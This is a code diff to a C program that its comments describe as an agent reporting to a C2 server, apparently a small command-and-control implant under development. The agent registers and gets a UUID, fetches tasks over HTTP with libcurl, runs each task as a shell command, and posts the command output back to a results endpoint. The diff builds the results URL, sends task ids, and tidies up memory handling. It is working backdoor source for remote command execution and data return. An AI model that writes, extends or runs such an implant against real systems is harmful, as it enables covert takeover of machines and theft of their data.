@@ -118,11 +118,13 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
 	mem->size += realsize;
 	mem->response[mem->size] = 0;
 
-	//   printf("The data in the function is %s\n\n", mem->memory);
 
 	return realsize;
 }
 
+// Parses UUID from C2 registration response and concatenates to base tasks URL
+// to create complete tasks URL. Assigns URL value to corresponding field in
+// the agent_info struct.
 void create_tasks_url(char *response, struct agent_info *agent)
 {
 	char *ret;
@@ -140,10 +142,25 @@ void create_tasks_url(char *response, struct agent_info *agent)
 	// Copy URL to agent->tasks_url.
 	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
 	printf("Tasks URL is: %s", agent->tasks_url);
-	agent->got_tasks_url = true;
 
 	// Registration response is no longer needed. Free memory.
     free(response);
+
+}
+
+// Parses UUID from C2 registration response and concatenates to base tasks URL
+// to create complete tasks URL. Assigns URL value to corresponding field in
+// the agent_info struct.
+void create_results_url(struct agent_info *agent, struct tasks *task)
+{
+	// Concat agent UUID to results URL.
+	// Results base URL
+	char res_url[64] = "127.0.0.1:9000/results/";
+	strncat(res_url, agent->uuid, strlen(agent->uuid));
+
+	// Copy URL to agent->results_url.
+	strncpy(task->results_url, res_url, strlen(res_url) +1);
+	printf("Results URL is: %s", task->results_url);
 
 }
 
@@ -172,8 +189,6 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 
 	CURLcode result = curl_easy_perform(web.curl);
 
-	printf("The data returning from check tasks is %s\n\n", sa->response);
-
 	if (result != CURLE_OK)
 	{
 		fprintf(stderr, "download problem: %s\n",
@@ -182,6 +197,8 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 	}
 
 	curl_easy_cleanup(web.curl);
+	curl_mime_free(web.form);
+
 	return true;
 }
 
@@ -200,6 +217,7 @@ bool parse_tasks(char *response, struct tasks *task)
 	int count = 0;
     memset(line, 0, sizeof(line));
 
+	char **tmp_space = NULL;
 // While loop reads each line FILE *word_source (file(s) or stdin).
 	while (fgets(line, sizeof(line), response_file) != NULL) {
 		++count;
@@ -208,7 +226,7 @@ bool parse_tasks(char *response, struct tasks *task)
 			space for new token. */
 		if (task->sz == task->cap) {
 			task->cap *= 2;
-			char **tmp_space = realloc(task->tasks_array,
+			tmp_space = realloc(task->tasks_array,
 							task->cap *
 							sizeof(*task->tasks_array));
 			if (!tmp_space) {
@@ -268,6 +286,7 @@ bool exec_cmd(struct tasks *task)
 	char line[1024] = {'\0'};
 	int cmd_ret = 0;
 	size_t cur_len = 0;
+	char *tmp_space = NULL;
 
 	char space[1] = " ";
 	strncat(task->cmd, space, sizeof(1));
@@ -280,7 +299,7 @@ bool exec_cmd(struct tasks *task)
 		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
 		{
 			size_t buf_len = strlen(line);
-			char *tmp_space = realloc(task->results, buf_len + cur_len + 1);
+			tmp_space = realloc(task->results, buf_len + cur_len + 1);
 			if (!tmp_space)
 			{
 				perror("Unable to resize.\n");
@@ -307,10 +326,16 @@ bool exec_cmd(struct tasks *task)
 	return true;
 }
 
-bool post_results(struct tasks *task)
+// Posts task results to C2 server.
+bool post_results(struct tasks *task, struct strings_array *sa)
 {
-	struct strings_array chunk = {.response = malloc(0), .size = 0};
+
 	struct web_comms web = {NULL, 0, NULL};
+	// struct strings_array chunk = {.response = malloc(0), .size = 0};
+	sa->response = malloc(0);
+	sa->size = 0;
+
+
 
 	if (!curl_prep(&web))
 	{
@@ -318,17 +343,16 @@ bool post_results(struct tasks *task)
 		exit(1);
 	}
 
-	add_curl_field(web.form, "task id", "1234");
-
+	add_curl_field(web.form, "task id", task->id);
 	add_curl_field(web.form, "task results", task->results);
-
-	// Add submit options to curl field data.
 	add_curl_field(web.form, "submit", "send");
 
-	// Registration URL
-	const char resurl[27] = "127.0.0.1:9000/results/uuid";
+	// // Registration URL
+	// const char resurl[27] = "127.0.0.1:9000/results/uuid";
 
-	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);
+	curl_easy_setopt(web.curl, CURLOPT_URL, task->results_url);
+	puts("********************************");
+	printf("The tasks results url is %s\n", task->results_url);
 
 	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);
 
@@ -336,12 +360,12 @@ bool post_results(struct tasks *task)
 	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
 	// Pass chunk to callback function.
-	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);
+	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
 
 	// Perform the request, res will get the return code
 	web.res = curl_easy_perform(web.curl);
 
-	printf("The data returning from post results is %s\n\n", chunk.response);
+	printf("The data returning from post results is %s\n\n", sa->response);
 
 	// Check for errors
 	if (web.res != CURLE_OK)
@@ -353,17 +377,13 @@ bool post_results(struct tasks *task)
 	// Always cleanup.
 	curl_easy_cleanup(web.curl);
 	
-	free(chunk.response);
-
 	// Then cleanup the form.
 	curl_mime_free(web.form);
 
 	return true;
 }
 
-
-
-
+// Frees memory for task array of strings.
 void destroy(struct tasks *task)
 {
 	/* Iterates through array elements and frees memory of each line in words
@@ -374,9 +394,13 @@ void destroy(struct tasks *task)
 		}
 	}
 	// Frees memory for entire file names array.
-	free(task->tasks_array);
+	if (task->tasks_array) {
+		free(task->tasks_array);
+	}
+
 }
 
+// Sets task struct values to zero.
 void reset_task_vals(struct tasks *task)
 {
 
@@ -388,7 +412,7 @@ void reset_task_vals(struct tasks *task)
 }
 
 //ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
-// converts char* to file*.
+// Converts data from *char type to FILE type.
 FILE *char_to_file(char *data) {
 
     int len;
